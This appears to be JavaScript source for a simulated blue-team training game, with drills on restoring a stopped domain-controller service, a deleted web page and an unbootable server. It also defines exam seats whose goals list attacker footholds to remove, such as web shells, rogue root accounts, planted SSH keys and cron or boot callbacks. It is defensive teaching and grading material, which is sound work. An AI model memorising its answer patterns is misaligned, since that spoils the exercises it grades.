      { vm: 'ad', drill: true, say: 'Now start it, then confirm POP3 is passing again.', type: 'Start-Service NTDS', done: (c) => KW(c.st, 'ad').live.winServices.find((x) => x.Name === 'NTDS').Status === 'Running', after: 'Enable, then start. The same holds for sc.exe config NTDS start= auto on the command line.' },
      login('web', 'Ubuntu Srv'),
      { vm: 'web', setup: (st) => { delete KW(st, 'web').fs['/var/www/html/index.html']; if (!KW(st, 'web').fs['/root/www.bak/index.html']) KW(st, 'web').fs['/root/www.bak/index.html'] = '<html><head><title>Driftless Managed Services</title></head><body><h1>Driftless Managed Services</h1></body></html>\n'; }, say: 'On the web box Red deleted the site\'s files. Apache is still running, so the port is open, but there is nothing to serve and the scorer compares the page content. Ask the server the way the scorer does.', type: 'curl http://localhost/', look: 'A 500 or an empty page, not the company page. The service is up but failing.' },
      { vm: 'web', drill: true, say: 'A restart will not bring back a deleted file. Put your morning backup back.', type: 'cp /root/www.bak/index.html /var/www/html/index.html', done: (c) => /Driftless Managed/.test(KW(c.st, 'web').fs['/var/www/html/index.html'] || ''), after: 'This is why you copy every web root and config to /root in the first fifteen minutes. You cannot restore what you never backed up.' },
      login('mail', 'Fedora'),
      { vm: 'mail', setup: (st) => { delete KW(st, 'mail').fs['/etc/fstab']; KW(st, 'mail').live.bricked = true; KW(st, 'mail').live.offlineUntil = Infinity; }, say: 'The worst case. Red deleted /etc/fstab and rebooted mail, so it no longer boots. Try to reach it.', type: 'whoami', expectFail: /timed out/, after: 'Dead. No shell, nothing to fix by hand, and both mail checks are now failing.' },
      { ask: { q: 'The box will not boot. What is the honest move, and why not just power-cycle it from NETLAB+?', a: /(tech support|revert|ticket|restore)/i, sample: 'File a Tech Support revert ticket', why: 'Power-cycling boots the same broken disk. Tech Support reverts the VM to its original state: it costs points and wipes your hardening (the original holes come back, so re-harden at once) — but a dead box scores zero all day. Same answer for a rootkit, where you cannot trust what the box tells you.' } },
    ],
  },
];

export const EXAMS = [
  { id: 'x-linux', title: 'Linux seat', minutes: 25, vms: ['web', 'dns', 'ecom', 'mail', 'uwks'], blurb: 'Five machines. No commands given. Keep every service up.', goals: [
    ...[['web-shell', 'Web: web shell removed'], ['web-uid0', 'Web: extra root account removed'], ['web-key', 'Web: planted SSH key removed'], ['dns-recursion', 'DNS: recursion limited'], ['dns-rootssh', 'DNS: root SSH off'], ['dns-rclocal', 'DNS: boot callback removed'], ['ecom-admin', 'Store: admin password changed'], ['ecom-db', 'Store: database not exposed'], ['ecom-cron', 'Store: cron callback removed'], ['ecom-preload', 'Store: preloaded library removed'], ['mail-relay', 'Mail: not an open relay'], ['mail-installer', 'Mail: installer removed'], ['mail-timer', 'Mail: timer removed'], ['wks-sudoers', 'Workstation: sudoers fixed'], ['wks-suid', 'Workstation: SUID removed']].map(([f, text]) => ({ text, done: (c) => c.st.findings[f].status === 'fixed' })),
    ...['web', 'dns', 'ecom', 'mail'].map((v) => ({ text: `${v}: root password changed`, done: (c) => !!c.st.devState[v].creds.root.strong })),
    { text: 'Every scored service still up', done: (c) => Object.values(c.st.services).every((s) => s.state === 'up') },
  ] },
  { id: 'x-windows', title: 'Windows seat', minutes: 15, vms: ['ad', 'win10', 'docker'], blurb: 'Domain controller, workstation and the Docker host.', goals: [
    ...[['ad-rogue', 'AD: rogue Domain Admin dealt with'], ['ad-smb1', 'AD: SMBv1 off'], ['ad-spooler', 'AD: Spooler stopped and disabled'], ['wks-admin', 'Workstation: rogue local admin removed'], ['wks-task', 'Workstation: rogue task removed'], ['wks-run', 'Workstation: Run key removed'], ['docker-api', 'Docker: API blocked, container removed']].map(([f, text]) => ({ text, done: (c) => c.st.findings[f].status === 'fixed' })),
    { text: 'AD: NTDS still running', done: (c) => c.st.devState.ad.live.winServices.find((s) => s.Name === 'NTDS').Status === 'Running' },
    { text: 'Every scored service still up', done: (c) => Object.values(c.st.services).every((s) => s.state === 'up') },
  ] },
  { id: 'x-firewall', title: 'Firewall seat', minutes: 10, vms: ['pan'], blurb: 'Lock down the Palo Alto from nothing. Nothing is live until the commit lands.', goals: [
    { text: 'Inbound locked to the scored services', done: (c) => c.st.findings['pan-allow-all'].status === 'fixed' },
    { text: 'Admin password changed and committed', done: (c) => !!c.st.devState.pan.creds.admin.strong },
    { text: 'No rule violations (ICMP kept, no source filtering)', done: (c) => c.st.findings['pan-allow-all'].status === 'fixed' && !c.st.ruleViolations?.length },
    { text: 'Every scored service still up', done: (c) => c.st.findings['pan-allow-all'].status === 'fixed' && Object.values(c.st.services).every((s) => s.state === 'up') },
  ] },
  { id: 'x-ir', title: 'Incident response seat', minutes: 12, vms: ['ecom'], blurb: 'Someone just got in to the store server. Find it, remove it, report it.', setup: (st) => { stageAttack(st, 'ecom', { tag: 'user', account: 'root' }); }, goals: [
    { text: 'Their session is gone', done: (c) => c.st.devState.ecom.live.sessions.length === 0 },
    { text: 'What they planted is gone', done: (c) => !c.st.engine.red.implants.some((i) => i.dev === 'ecom' && new RegExp(`^${i.artifact}:`, 'm').test(c.st.devState.ecom.fs['/etc/passwd'] || '')) },
    { text: 'Root password changed', done: (c) => !!c.st.devState.ecom.creds.root.strong },
    { text: 'Incident report filed and accepted', done: (c) => (c.lastIncident()?.credit || 0) >= 5 / 7 },
  ] },
];

const STUDY = {
  'pan-allow-all': 'panos', 'dns-recursion': 'scored', 'dns-rootssh': 'scored', 'dns-rclocal': 'deeplinux', 'web-shell': 'persistence', 'web-uid0': 'persistence', 'web-key': 'deeplinux', 'ecom-admin': 'scored', 'ecom-db': 'hostfw', 'ecom-cron': 'persistence', 'ecom-preload': 'deeplinux', 'mail-relay': 'scored', 'mail-installer': 'scored', 'mail-timer': 'deeplinux', 'ad-rogue': 'windows', 'ad-smb1': 'windows', 'ad-spooler': 'windows', 'docker-api': 'docker', 'splunk-default': 'scored', 'wks-admin': 'windows', 'wks-sudoers': 'persistence', 'wks-task': 'windeep', 'wks-run': 'windeep', 'wks-suid': 'deeplinux',
};

/** What to study after a round, most useful first: [{ lesson, why }]. */
export function studyNext(state, grade) {
  const out = new Map();
  const add = (lesson, why) => { if (!out.has(lesson)) out.set(lesson, why); };
  if (grade.violationPenalty) add('panos', grade.ruleViolations.map((v) => v.text).join(' '));
  if (grade.slaCount) add('breakfix', `${grade.slaCount} SLA violation(s): services stayed down too long.`);
  const missed = grade.injectResults.filter((r) => r.max && !r.answered).length;
  if (missed) add('injects', `${missed} inject(s) were never answered.`);
  if (grade.injectMax && grade.injectPts / grade.injectMax < 0.6 && !missed) add('injects', 'Memos lost points: check what each one was missing.');
  if (state.engine?.pcr?.breaking) add('passwords', 'Staff passwords changed without a ticket.');
  if (!(state.incidents || []).length && state.engine?.red?.events?.length) add('incident', 'Red Team was active and no incident report was filed.');
  const groups = {};
  for (const f of state.findingList) if (state.findings[f.id].status !== 'fixed' && STUDY[f.id]) (groups[STUDY[f.id]] ||= []).push(f.title);
  for (const [lesson, titles] of Object.entries(groups)) add(lesson, `Left open: ${titles.join('; ')}.`);
  return [...out.entries()].map(([lesson, why]) => ({ lesson, why }));
}
